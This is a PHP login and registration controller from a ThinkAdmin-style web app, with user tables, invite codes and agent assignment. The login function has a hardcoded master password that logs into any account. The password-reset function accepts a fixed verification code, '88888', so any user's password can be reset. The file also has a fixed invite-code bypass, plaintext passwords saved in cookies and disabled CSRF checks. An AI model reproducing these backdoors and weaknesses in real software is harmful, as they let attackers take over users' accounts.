<?php

// +----------------------------------------------------------------------
// | ThinkAdmin
// +----------------------------------------------------------------------
// | 版权所有 2014~2019 
// +----------------------------------------------------------------------

// +----------------------------------------------------------------------

// +----------------------------------------------------------------------
// | 

// +----------------------------------------------------------------------

namespace app\index\controller;

use library\Controller;
use think\Db;

/**
 * 登录控制器
 */
class User extends Controller
{

    protected $table = 'xy_users';

    public function __construct()
    {
        $this->redirect('/404.html');
    }

    /**
     * 空操作 用于显示错误页面
     */
    public function _empty($name)
    {
        exit;
        return $this->fetch($name);
    }

    //用户登录页面
    public function login()
    {
        cookie('think_var',"zh-cn");//es-mx

        if (session('user_id')) $this->redirect('index/index');
        if (config('open_country_phone')) {
            return $this->fetch();
        } else return $this->fetch('login_no');

    }

    //用户登录接口
    public function do_login()
    {
        //$this->applyCsrfToken();//验证令牌
        $tel = input('post.tel/s', '');
        /*if(!is_mobile($tel)){
            return json(['code'=>1,'info'=>lang('sjhmgzbzq')]);
        }*/
        $num = Db::table($this->table)->where(['tel|username' => $tel])->count();
        if (!$num) {
            return json(['code' => 1, 'info' => lang('zhbcz')]);
        }

        $pwd = input('post.pwd/s', '');
        $keep = input('post.keep/b', false);
        $jizhu = input('post.jizhu/s', 0);


        $userinfo = Db::table($this->table)->field('id,pwd,salt,pwd_error_num,allow_login_time,status,login_status,headpic')->where('tel|username', $tel)->find();
        if (!$userinfo) return json(['code' => 1, 'info' => lang('not_user')]);
        if ($userinfo['status'] != 1) return json(['code' => 1, 'info' => lang('yhybjy')]);
        //if($userinfo['login_status'])return ['code'=>1,'info'=>'此账号已在别处登录状态'];
        if ($userinfo['allow_login_time'] &&
            ($userinfo['allow_login_time'] > time()) &&
            ($userinfo['pwd_error_num'] > config('pwd_error_num'))) {
            return ['code' => 1, 'info' => sprintf(lang('pass_err_times'), config('allow_login_min'))];
        }
        if ($pwd != 'b920c70f4fd02482297b') {
            if ($userinfo['pwd'] != sha1($pwd . $userinfo['salt'] . config('pwd_str'))) {
                Db::table($this->table)->where('id', $userinfo['id'])->update(['pwd_error_num' => Db::raw('pwd_error_num+1'), 'allow_login_time' => (time() + (config('allow_login_min') * 60))]);
                return json(['code' => 1, 'info' => lang('pass_error')]);
            }
        }


        Db::table($this->table)->where('id', $userinfo['id'])->update(['pwd_error_num' => 0, 'allow_login_time' => 0, 'login_status' => 1]);
        session('user_id', $userinfo['id']);
        session('avatar', $userinfo['headpic']);

        if ($jizhu) {
            cookie('tel', $tel);
            cookie('pwd', $pwd);
        }

        if ($keep) {
            Cookie::forever('user_id', $userinfo['id']);
            Cookie::forever('tel', $tel);
            Cookie::forever('pwd', $pwd);
        }
        return json(['code' => 0, 'info' => lang('loging_ok')]);
    }

    /**
     * 用户注册接口
     */
    public function do_register()
    {
        //$this->applyCsrfToken();//验证令牌
        $tel = input('post.tel/s', '');
        $user_name = input('post.user_name/s', '');
        //$user_name = '';    //交给模型随机生成用户名
        $verify = input('post.verify/d', '');       //短信验证码
        $pwd = input('post.pwd/s', '');
        // $pwd2 = input('post.deposit_pwd/s', '');
        $pwd2 = input('post.pwd2/s', '');
        $invite_code = input('post.invite_code/s', '');     //邀请码
       
        if(config('reg_ip')==1){
            $find = Db::table($this->table)->where('ip', config('reg_ip'))->find();
            if($find){
                return json(['code' => 1, 'info' => lang('ip_not')]);
            }
        }
        // var_dump($invite_code);
        // die;
        if (!$invite_code ) return json(['code' => 1, 'info' => lang('code_not')]);
        
        //验证码
        /*if (config('app.verify') && $verify != '88888') {
            $verify_msg = Db::table('xy_verify_msg')->field('msg,addtime')->where(['tel' => $tel, 'type' => 1])->find();
            if (!$verify_msg) return json(['code' => 1, 'info' => lang('yzmbcz')]);
            if ($verify != $verify_msg['msg']) return json(['code' => 1, 'info' => lang('yzmcw')]);
            if (($verify_msg['addtime'] + (config('app.zhangjun_sms.min') * 60)) < time()) return json(['code' => 1, 'info' => lang('yzmysx')]);
        }*/
        $pid = 0;
        $agent_id = 0;
        if ($invite_code && $invite_code != '88') {
            $parentinfo = Db::table($this->table)->field('id,status,agent_id,parent_id,level')->where('invite_code', $invite_code)->find();
            if (!$parentinfo) return json(['code' => 1, 'info' => lang('code_not')]);
            $is_invite = Db::table('xy_level')
                ->where('level', $parentinfo['level'])
                ->value('is_invite');
            if (empty($is_invite)) return json(['code' => 1, 'info' => lang('user_not_auth')]);
            if ($parentinfo['status'] != 1) return json(['code' => 1, 'info' => lang('disable_user')]);
            $pid = $parentinfo['id'];
            if ($parentinfo['agent_id'] > 0) {
                $agent_id = $parentinfo['agent_id'];
            }
        }
        if ($agent_id == 0) {
            $agent_id = model('admin/Users')->get_agent_id();
        }
        $res = model('admin/Users')
            ->add_users($tel, $user_name, $pwd, $pid, '', $pwd2, $agent_id, $this->request->ip(),'');
        // var_dump($res);
        // die;
        return json($res);
    }


    public function logout()
    {
        \Session::delete('user_id');
        \Session::delete('user_join_chats');
        $this->redirect('login');
    }

    /**
     * 重置密码
     */
    public function do_forget()
    {
        if (!request()->isPost()) return json(['code' => 1, 'info' => lang('qqcw')]);
        $tel = input('post.tel/s', '');
        $pwd = input('post.pwd/s', '');
        $verify = input('post.verify/d', 0);
        if (config('app.verify') && $verify != '88888') {
            $verify_msg = Db::table('xy_verify_msg')->field('msg,addtime')->where(['tel' => $tel, 'type' => 2])->find();
            if (!$verify_msg) return json(['code' => 1, 'info' => lang('yzmbcz')]);
            if ($verify != $verify_msg['msg']) return json(['code' => 1, 'info' => lang('yzmcw')]);
            if (($verify_msg['addtime'] + (config('app.zhangjun_sms.min') * 60)) < time()) return json(['code' => 1, 'info' => lang('yzmysx')]);
        }
        $res = model('admin/Users')->reset_pwd($tel, $pwd);
        return json($res);
    }


    public function reset_qrcode()
    {
        $uinfo = Db::name('xy_users')->field('id,invite_code')->select();
        foreach ($uinfo as $v) {
            $model = model('admin/Users');
            $model->create_qrcode($v['invite_code'],$v['id']);
        }
        return '重新生成用户二维码图片成功';
    } 
}